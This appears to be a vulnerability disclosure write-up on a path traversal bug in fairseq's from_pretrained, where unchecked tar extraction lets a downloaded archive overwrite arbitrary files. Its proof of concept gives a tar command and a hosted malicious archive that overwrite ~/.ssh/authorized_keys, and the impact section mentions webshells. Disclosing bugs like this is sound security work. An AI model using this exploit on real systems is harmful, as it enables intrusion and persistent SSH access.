---
layout: post
title:  "Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api"
date:  2024-04-07 10:31:06 +0800
categories: file-overwrite
---

## Name

> Arbitrary File Overwrite in from_pretrained api in facebook fairseq.(Duplicate)

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Description

The [from_pretrained](https://fairseq.readthedocs.io/en/latest/models.html?highlight=from_pretrained#fairseq.models.BaseFairseqModel.from_pretrained) function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.

The vulnerable function is exposed through the [BaseFairseqModel.from_pretrained](https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/models/fairseq_model.py#L272) function. It's an api used to read pretrained from files on disk, S3 path, or URL which is tar file.

```
def from_pretrained(
        cls,
        model_name_or_path,
        checkpoint_file="model.pt",
        data_name_or_path=".",
        **kwargs,
    ):
        from fairseq import hub_utils

        x = hub_utils.from_pretrained(
            model_name_or_path,
            checkpoint_file,
            data_name_or_path,
            archive_map=cls.hub_models(),
            **kwargs,
        )
        logger.info(x["args"])
        return hub_utils.GeneratorHubInterface(x["args"], x["task"], x["models"])
```

and then it calls [hub_utils.from_pretrained](https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/hub_utils.py#L23), in this function, it calls [file_utils.load_archive_file](https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L54) to download file from `model_name_or_path`

```
def from_pretrained(
    model_name_or_path,
    checkpoint_file="model.pt",
    data_name_or_path=".",
    archive_map=None,
    **kwargs
):
    ...
    model_path = file_utils.load_archive_file(model_name_or_path)
```

in `file_utils.load_archive_file`, it calls `file_utils.cached_path` firstly:

```
def load_archive_file(archive_file):
    # redirect to the cache, if necessary
    try:
        resolved_archive_file = cached_path(archive_file, cache_dir=None)
    except EnvironmentError:
        logger.info(
            "Archive name '{}' was not found in archive name list. "
            "We assumed '{}' was a path or URL but couldn't find any file "
            "associated to this path or URL.".format(
                archive_file,
                archive_file,
            )
        )
        return None

    if resolved_archive_file == archive_file:
        logger.info("loading archive file {}".format(archive_file))
    else:
        logger.info(
            "loading archive file {} from cache at {}".format(
                archive_file, resolved_archive_file
            )
        )

    # Extract archive to temp dir and replace .tar.bz2 if necessary
    tempdir = None
    if not os.path.isdir(resolved_archive_file):
        tempdir = tempfile.mkdtemp()
        logger.info(
            "extracting archive file {} to temp dir {}".format(
                resolved_archive_file, tempdir
            )
        )
        ext = os.path.splitext(archive_file)[1][1:]
        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
            top_dir = os.path.commonprefix(archive.getnames())
            archive.extractall(tempdir)
        os.remove(resolved_archive_file)
        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
        shutil.rmtree(tempdir)

    return resolved_archive_file
```

and then in `file_utils.cached_path`, when parmeter `url_or_filename` is an url, it calls [file_utils.get_from_cache](https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L279) to download tar file and save file content in temperary file and return the temperary file path to `file_utils.load_archive_file`.

```
def get_from_cache(url, cache_dir=None):
    ...    
    cache_path = os.path.join(cache_dir, filename)
    if not os.path.exists(cache_path):
        # Download to temporary file, then copy to cache dir once finished.
        # Otherwise you get corrupt cache entries if the download gets interrupted.
        with tempfile.NamedTemporaryFile() as temp_file:
            logger.info("%s not found in cache, downloading to %s", url, temp_file.name)

            # GET file object
            if url.startswith("s3://"):
                s3_get(url, temp_file)
            else:
                ##### Download tar file from url!!!!! #####
                http_get(url, temp_file)

            # we are copying the file before closing it, so flush to avoid truncation
            temp_file.flush()
            # shutil.copyfileobj() starts at the current position, so go to the start
            temp_file.seek(0)
    ...
    return cache_path
```

Back to `file_utils.load_archive_file`, the malicious tar file is opened by `tarfile.open` and extracted by `archive.extractall` without any security checks which is well-known vulnerability. when tar file is compressed by `tar` option `--absolute-names`, absolute path names and relative path names can be included in tar file. When extracted by `tarfile.extractall`, the file with absolute names will overwrite target files silently, causing arbitrary file overwite.

```
def load_archive_file(archive_file):
    ...
    # Extract archive to temp dir and replace .tar.bz2 if necessary
    tempdir = None
    if not os.path.isdir(resolved_archive_file):
        tempdir = tempfile.mkdtemp()
        logger.info(
            "extracting archive file {} to temp dir {}".format(
                resolved_archive_file, tempdir
            )
        )
        ext = os.path.splitext(archive_file)[1][1:]
        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
            top_dir = os.path.commonprefix(archive.getnames())
            archive.extractall(tempdir)
        os.remove(resolved_archive_file)
        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
        shutil.rmtree(tempdir)

    return resolved_archive_file
```

During the testing, I found the file to be overwrite is missing. By reading the source code carefully, it uses `shutil.move` to move files extracted to `resolved_archive_file` target. The move source is from `os.path.join(tempdir, top_dir)` and `top_dir` is from `os.path.commonprefix(archive.getnames())`. Well, this is controlled by attacker, in [Python documents](https://docs.python.org/3/library/os.path.html#os.path.commonprefix), when list contains both abs and relative pathnames, it will return empty string in which attacker can include abs and relative names in tar file, and then `move` source will be `tempdir` which bypass the `shutil.move`. 

```
> os.path.commonprefix(['/home/kali/.ssh/xx', '404.html'])
  ''
> os.path.join("/root/tmp/","")
  '/root/tmp/'
```

## Proof of Concept

An attacker can create a malicous tar file using following command:

```
tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys 404.html
```

Then, the attacker will upload the `hack.tar` to public server. 

I have uploaded one malicous tar file for testing: [https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar](https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar)

If anyone now downloads tar using `from_pretrained` api, causing automatically extracting the malicous tar file and overwrite files silently.

```
from fairseq.models.transformer import TransformerModel
model = TransformerModel.from_pretrained('https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar')
```

```
> cat /home/kali/.ssh/authorized_keys
ssh-rsa xxx hacker@test.com
```

Tested on Google Colab: [https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing](https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing)

![poc](https://live.staticflickr.com/65535/53639482085_b57cae8712_k.jpg)

## Impact

This vulnerability can have severe consequences. This section will highlight some tangible impact.

### SSH Access

On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.

### Web Servers

On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)


## Reference

[https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89](https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89)

## Occurrences

[https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90](https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90)
